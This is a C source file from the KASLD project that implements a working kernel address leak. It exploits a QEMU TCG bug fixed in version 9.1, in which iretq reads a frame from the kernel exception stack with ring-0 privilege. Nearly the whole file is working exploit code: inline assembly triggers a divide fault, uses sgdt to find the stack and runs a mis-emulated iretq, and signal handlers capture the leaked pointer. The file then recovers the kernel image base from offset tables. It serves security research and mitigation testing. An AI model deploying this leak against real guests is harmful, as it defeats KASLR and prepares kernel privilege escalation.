// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak a kernel text address inside a QEMU (<9.1) guest (x86-64) using `iret`.
//
// The QEMU TCG (Tiny Code Generator) implementation performs the stack reads
// of the iret and call-far (retf) instructions as if the current privilege
// level were 0 (a supervisor access), rather than using the executing ring's
// CPL. A ring-3 program can therefore point rsp at a kernel address and have
// iret read the return frame from it — an access that should fault — pulling a
// kernel value out into the guest. The div-by-zero always faults through
// vector 0, so the value recovered is the return address of the divide-error
// handler left on the kernel stack — asm_exc_divide_error+0xf on >= 5.8, or
// divide_error+<small> on older kernels. It is a kernel .text pointer at a
// build-specific offset above _text (a few KiB on 6.17+ where the entry stubs
// sit at the front of .text, up to tens of MiB on older layouts).
//
// Patched in QEMU version 9.1.
//
// The leak primitive (the div/sgdt/iretq sequence and signal handlers)
// is used largely verbatim from original code by @_leave07 and @prosti:
// https://kqx.io/post/qemu-nday/#leak-exploit
//
// Output (on a recognized build the image base is also recovered):
// [.] trying QEMU TCG iret leak ...
// [+] leaked kernel text address: ffffffff886010af   (asm_exc_divide_error+0xf)
// [.] image base at or below: ffffffff88600000
// [+] recovered image base: ffffffff87600000
// V kernel_text:asm_exc_divide_error pos=interior conf=parsed
// sample=0xffffffff886010af V kernel_image:_text pos=base conf=heuristic
// lo=0xffffffff87600000
//
// Leak primitive:
//   Data leaked:      kernel .text address (asm_exc_divide_error+0xf return
//   site) Kernel subsystem: QEMU TCG — iret instruction emulation bug Data
//   structure:   return-address slot in the kernel exception stack frame
//   Address type:     virtual (kernel text)
//   Method:           parsed (QEMU reads the iret frame as ring 0)
//   Patched:          QEMU v9.1 (commit 0bd385e7)
//   Status:           fixed in QEMU v9.1 (not a kernel bug)
//   Access check:     N/A (QEMU TCG emulation bug; not a kernel vulnerability)
//   Source:           N/A (QEMU bug, not kernel source)
//
// Mitigations:
//   Fixed in QEMU v9.1. Only affects QEMU TCG (software emulation);
//   KVM (hardware virtualization) is not affected. Not a kernel bug.
//   The exception stack is located via `sgdt`; when the guest CPU exposes
//   UMIP the kernel emulates `sgdt` with a dummy GDT base, so the leak cannot
//   find the frame even on a vulnerable QEMU. That case is detected up front
//   and reported UNAVAILABLE (mitigation: umip) before the faulting iret runs.
//   KPTI does NOT block this leak: the exception stack lives in the
//   cpu_entry_area, which is mapped in the user page tables even under KPTI.
//
// References:
// https://kqx.io/post/qemu-nday/#leak-exploit
// https://bugs.launchpad.net/qemu/+bug/1866892
// https://gitlab.com/qemu-project/qemu/-/commit/0bd385e7e3c33e987d7a8879918be6df7b111ac4
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported (x86-64 only)"
#endif

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/hash.h"
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/utsname.h>

KASLD_EXPLAIN(
    "Inside a QEMU TCG (software-emulated) x86_64 guest, the iret "
    "instruction performs its stack reads as ring 0 instead of the "
    "executing ring's privilege level. A ring-3 program points rsp at the "
    "kernel exception stack, and iret reads back an exception handler's "
    "return address — a kernel .text pointer — which faults on use and is "
    "kept as a text sample. Fixed in QEMU v9.1.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "live:1\n"
           "discloses:virtual\n"
           "patch:QEMU v9.1\n");

/* UMIP (User-Mode Instruction Prevention) emulation dummy GDT base. When UMIP
 * is active the kernel traps `sgdt` from ring 3 and returns this hardcoded base
 * (arch/x86/kernel/umip.c: UMIP_DUMMY_GDT_BASE) instead of the real GDTR — so
 * the exception stack cannot be located and the technique cannot work. UMIP is
 * present on Intel Cannon Lake+ (2018) and AMD Zen 2+ (2019). */
#define UMIP_DUMMY_GDT_BASE 0xfffffffffffe0000UL

/* True when `sgdt` is being emulated by the kernel under UMIP (dummy base). */
static int umip_active(void) {
  struct {
    uint16_t limit;
    uint64_t base;
  } __attribute__((packed)) gdtr;
  __asm__ volatile("sgdt %0" : "=m"(gdtr));
  return (unsigned long)gdtr.base == UMIP_DUMMY_GDT_BASE;
}

/* Per-build recovery data: a hash of the build fingerprint and the divide-error
 * (#DE) entry stub's offset from the kernel image base — i.e. (handler -
 * _text), read from System.map/kallsyms. The stub is asm_exc_divide_error on
 * >= 5.8 and divide_error on older kernels, held in offsets[] and
 * offsets_divide_error[] respectively (a build uses exactly one). The leak
 * returns handler+<small>, so the exact image base is floor(leaked - offset):
 * flooring to the KASLR grid absorbs the sub-alignment return-site remainder.
 *
 * The key is an FNV-1a-64 hash of the full uname ("<release> <version>"), not
 * the string itself, to keep the tables compact (~4900 rows). The fingerprint
 * is composed and trailing-space-trimmed by kasld_uname_fingerprint() exactly
 * as it would be for a string compare — long Ubuntu HWE versions overflow
 * utsname.version's 64-char field and clip, sometimes on a space — and the
 * trimmed bytes are hashed. The table is collision-free by construction (the
 * generator refuses to emit two rows with the same hash), so every build in the
 * table matches its own row exactly; the readable uname is kept as a trailing
 * // comment on each row. A match only sets the likely window (CONF_HEURISTIC)
 * and the guaranteed window rests on the interior sample, so even the ~N/2^64
 * chance that an untabled kernel hashes onto a row can perturb only the likely
 * window. */
struct kernel_info {
  uint64_t uname_hash; /* FNV-1a-64 of the trimmed "<release> <version>" */
  uint32_t de_offset;  /* (#DE handler symbol) - _text */
} __attribute__((packed));

/* Legacy #DE handler table. Kernels before the 5.8 asm_exc_* entry-stub
 * rename name the divide-error stub `divide_error`, not
 * `asm_exc_divide_error`. The leak and recovery are identical (base =
 * floor(leaked - offset)); a build uses exactly one of the two symbols. */
#ifdef __has_include
#if !__has_include("offsets/qemu_tcg_iret.inc")
#error "offsets/qemu_tcg_iret.inc missing — regenerate the offset table"
#endif
#endif
#include "offsets/qemu_tcg_iret.inc"
#ifndef KASLD_OFFSETS_PRESENT
#error "offsets/qemu_tcg_iret.inc did not define the table — regenerate it"
#endif
#undef KASLD_OFFSETS_PRESENT

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

/* Match the running kernel's full uname against both #DE-handler tables and, on
 * a hit, store (handler - _text) in *off and return the handler symbol name;
 * else NULL. Kernels >= 5.8 name the divide-error stub asm_exc_divide_error;
 * older kernels name it divide_error. A build uses exactly one, so try the
 * modern table first, then the legacy one. The fingerprint (compose +
 * trailing-space trim) is built by kasld_uname_fingerprint() and reduced to the
 * FNV-1a-64 table key; see kernel_info for the hashing rationale. */
static const char *match_de_handler(uint64_t *off) {
  struct utsname u;
  char v[512];
  uint64_t h;
  unsigned long i;
  const char *sym = NULL;

  if (kasld_uname(&u) != 0)
    return NULL;
  kasld_uname_fingerprint(v, sizeof(v), &u);
  h = kasld_fnv1a64(v);
  for (i = 0; i < ARRAY_SIZE(offsets); i++)
    if (offsets[i].uname_hash == h) {
      *off = offsets[i].de_offset;
      sym = "asm_exc_divide_error";
      break;
    }
  if (!sym)
    for (i = 0; i < ARRAY_SIZE(offsets_divide_error); i++)
      if (offsets_divide_error[i].uname_hash == h) {
        *off = offsets_divide_error[i].de_offset;
        sym = "divide_error";
        break;
      }
  /* One line per lookup, whichever table matched. */
  if (sym)
    kasld_info("kernel version '%s' detected", v);
  else
    kasld_info("kernel version '%s' not recognized", v);
  return sym;
}

static uint64_t kbase;
static sigjmp_buf env;

// SIGFPE handler: triggered by the intentional div-by-zero in kaslr().
// Advances RIP past the 3-byte `div rax` instruction so execution
// continues with the sgdt/iretq sequence.
static void sigfpe_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  uc->uc_mcontext.gregs[REG_RIP] += 3;
}

// SIGSEGV handler: when the leak fires, the mis-emulated iretq has popped an
// exception handler's return address off the kernel exception stack into RIP
// and faulted trying to execute it from ring 3 (SMEP). RIP here is therefore a
// kernel .text address — the handler's return address, read off the kernel
// stack. (If the read instead faults, or lands on a non-text value, main()
// discards it.)
static void sigsegv_handler(int sig, siginfo_t *si, void *context) {
  (void)sig;
  (void)si;
  ucontext_t *uc = (ucontext_t *)context;

  kbase = (uint64_t)uc->uc_mcontext.gregs[REG_RIP];

  siglongjmp(env, 1);
}

/* Candidate offsets from the GDT base (leaked by sgdt) to the CPU-pushed iret
 * frame on the kernel exception stack. The div-by-zero enters the kernel
 * through the #DE gate; the CPU writes the return frame onto the trampoline
 * entry stack inside the per-CPU cpu_entry_area, at a fixed distance above the
 * GDT that page is adjacent to. That distance is a compile-time property of the
 * cpu_entry_area / entry-stack layout and varies by build: 0x1f50 on distro
 * kernels from ~5.4 onward, 0x1150 on older distro builds (<= 5.3), RHEL-8
 * (4.18), and upstream-config builds. It is not the (#DE handler - _text) value
 * in the offset tables (that is .text layout, unrelated), and it is not
 * derivable from the symbol map or the release string: two builds of the same
 * version can use different slots (e.g. a distro 5.4 uses 0x1f50 while an
 * upstream-config 5.4 uses 0x1150), because the slot follows the entry-area
 * layout, not the version. So the frame is located by probing — each candidate
 * is read in turn and the first that yields a kernel .text pointer is the leak.
 * On any given build exactly one candidate lands on the frame; the others read
 * a mapped non-text value that is discarded, so the probe is unambiguous. The
 * order is immaterial to correctness (only one candidate ever yields text); the
 * common slot is listed first so most builds match on the first probe. */
static const uint64_t frame_offsets[] = {
    0x1f50, /* distro kernels >= ~5.4 (the bulk of the offset tables) */
    0x1150, /* distro <= 5.3, RHEL-8 (4.18), upstream-config builds */
};

static void kaslr(uint64_t frame_off) {
  __asm__ volatile(
      ".intel_syntax noprefix\n"

      // Step 1: Load a recognizable landmark frame into registers R15-R12.
      // When the div-by-zero fault fires, these callee-saved regs are
      // pushed onto the kernel exception stack as pt_regs, marking a known
      // spot below the handler's return address: {RIP=0x133a000, CS=0x33,
      // RFLAGS=0x206, RSP=unused, SS=0x2b}.
      "mov r15, 0x33\n"      // CS: user-mode code segment
      "mov r14, 0x206\n"     // RFLAGS: IF set
      "mov r13, 0x133a000\n" // RIP: target address (unmapped)
      "mov r12, 0x2b\n"      // SS: user-mode stack segment

      // Step 2: Trigger a divide-by-zero exception.
      // The SIGFPE handler advances RIP past this instruction.
      // The fault pushes R15-R12 (the fake iret frame) onto the
      // kernel exception stack.
      "mov rax, 0\n"
      "div rax\n"

      // Step 3: Use `sgdt` (executable from ring 3) to leak the
      // GDT base address, then compute the address on the kernel
      // exception stack where the fault handler's return address
      // (a kernel .text pointer) sits just above the fake iret frame.
      "push rax\n"
      "sgdt [rsp]\n"
      "mov rax, qword [rsp+2-8]\n" // GDT base address
      "add rax, %[frame_off]\n" // probed offset to iret frame (frame_offsets[])
      "mov rsp, rax\n"

      // Step 4: Execute iretq. Due to the QEMU bug, iretq in ring 3 reads
      // the frame from where RSP now points (the kernel exception stack) as
      // a ring-0 access instead of faulting. It pops the exception handler's
      // return address — sitting just above the landmark frame — into RIP,
      // then faults trying to execute that kernel .text address from ring 3.
      // The SIGSEGV handler captures it from the signal context.
      "iretq\n"
      ".att_syntax noprefix\n"
      :
      : [frame_off] "r"(frame_off)
      : "rax", "rdx", "r12", "r13", "r14", "r15", "cc", "memory");
}

static uint64_t get_kernel_text_addr_using_qemu_tcg_iret(void) {
  kasld_info("trying QEMU TCG iret leak ...");

  // Install SIGFPE handler to recover from the intentional div-by-zero
  struct sigaction sa_fpe = {0};
  sa_fpe.sa_sigaction = sigfpe_handler;
  sa_fpe.sa_flags = SA_SIGINFO;
  sigaction(SIGFPE, &sa_fpe, NULL);

  // Set up an alternate signal stack so the SIGSEGV handler can run even
  // when RSP has been corrupted to a kernel address (which happens whenever
  // the leak does not fire — patched QEMU, or the frame read itself faults —
  // so iretq faults before restoring a valid RSP). The alt stack is
  // load-bearing for this technique — without it, that faulting iretq drops
  // the handler onto the corrupted main stack and the component segfaults
  // instead of cleanly reporting "no leak". Bail rather than continue with the
  // safeguard silently disabled.
  stack_t ss;
  ss.ss_sp = malloc(SIGSTKSZ);
  if (!ss.ss_sp) {
    /* This returns a leaked address (0 = none); the safeguard cannot be armed,
     * so report no leak rather than letting an exit-code value escape as an
     * address. */
    kasld_err("alt-stack alloc failed; aborting");
    return 0;
  }
  ss.ss_size = SIGSTKSZ;
  ss.ss_flags = 0;
  sigaltstack(&ss, NULL);

  // Install SIGSEGV handler to capture the leaked kernel address
  struct sigaction sa_segv = {0};
  sa_segv.sa_sigaction = sigsegv_handler;
  sa_segv.sa_flags = SA_SIGINFO | SA_ONSTACK;
  sigemptyset(&sa_segv.sa_mask);
  sigaction(SIGSEGV, &sa_segv, NULL);

  // Pre-map a stack region just below 0x133a000 (the landmark RIP). Used as
  // a fallback stack for the path where iretq pops the landmark frame and
  // jumps to 0x133a000 instead of leaking; this growsdown mapping at
  // 0x1338000 is adjacent to that target.
  mmap((void *)0x1338000, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_POPULATE,
       -1, 0);

  // Probe each candidate frame offset. The mis-emulated iretq reads that slot
  // of the kernel exception stack; on the offset that lands on the real frame
  // the popped value is a kernel .text pointer (the #DE handler return
  // address), while a wrong offset reads a mapped non-text value that is
  // discarded. Exactly one candidate matches on any given build (see
  // frame_offsets[]), so the first text hit is the leak. Each attempt returns
  // here via siglongjmp from the SIGSEGV handler, so kbase is reset before
  // every probe.
  for (unsigned long i = 0; i < ARRAY_SIZE(frame_offsets); i++) {
    kbase = 0;
    if (sigsetjmp(env, 1) == 0) {
      kaslr(frame_offsets[i]);
    }
    if (kasld_addr_is_kernel_text(kbase)) {
      kasld_found("leaked kernel text address: %lx", kbase);
      return kbase;
    }
  }

  return 0;
}

int main(void) {
  if (kasld_skip_live_probe("iret"))
    return 0;

  // UMIP emulates `sgdt` with a dummy GDT base, so the exception stack cannot
  // be located. Detect it up front and bail before the faulting iret — on a
  // UMIP host that iret reads unmapped memory and logs a spurious kernel
  // page-fault Oops. UMIP is a defensive control that is present, so report it
  // as a mitigation (exit UNAVAILABLE). KPTI, by contrast, does not block this
  // leak: the exception stack lives in the cpu_entry_area, which stays mapped
  // in the user page tables even under KPTI.
  if (umip_active()) {
    kasld_err("UMIP active: kernel emulates sgdt with a dummy GDT base, so the "
              "exception stack cannot be located; the leak cannot work");
    return kasld_disp_mitigation(
        "umip", "UMIP emulates sgdt; kernel exception stack not locatable");
  }

  unsigned long addr = get_kernel_text_addr_using_qemu_tcg_iret();

  if (!addr) {
    kasld_err("QEMU TCG IRET fault not triggered");
    return 0;
  }

  // The leak is an interior .text pointer, not the image base: the div-by-zero
  // always faults through vector 0, so `addr` is the return address inside the
  // #DE entry stub (asm_exc_divide_error on >= 5.8, divide_error on older),
  // observed just past its start. Its distance from _text is build-specific (a
  // few KiB to tens of MiB), so the sample is named for provenance but the
  // engine bounds the base from it — the base is grid-aligned at or below the
  // floored sample. When the build is in neither table the exact stub name is
  // unknown (and differs by version), so the sample is labeled neutrally as a
  // .text address rather than guessing a symbol.
  uint64_t de_off = 0;
  const char *de_sym = match_de_handler(&de_off);

  kasld_info("image base at or below: %lx", kasld_floor_text_base(addr));
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr,
                      de_sym ? de_sym : ".text", CONF_PARSED);

  // If the exact build is known, subtract the #DE handler's offset from _text
  // to recover the image base. Flooring to the KASLR grid absorbs the
  // sub-alignment return-site remainder, so the result is _text exactly. Report
  // it at CONF_HEURISTIC — the recovery trusts the uname build fingerprint, not
  // proof, so it pins only the likely window; the CONF_PARSED sample above
  // still bounds the guaranteed window soundly if the table is ever stale.
  if (de_sym) {
    unsigned long base = kasld_floor_text_base(addr - de_off);
    if (kasld_addr_is_kernel_text(base) && addr >= base) {
      kasld_found("recovered image base: %lx", base);
      kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                        CONF_HEURISTIC);
    }
  }

  return 0;
}
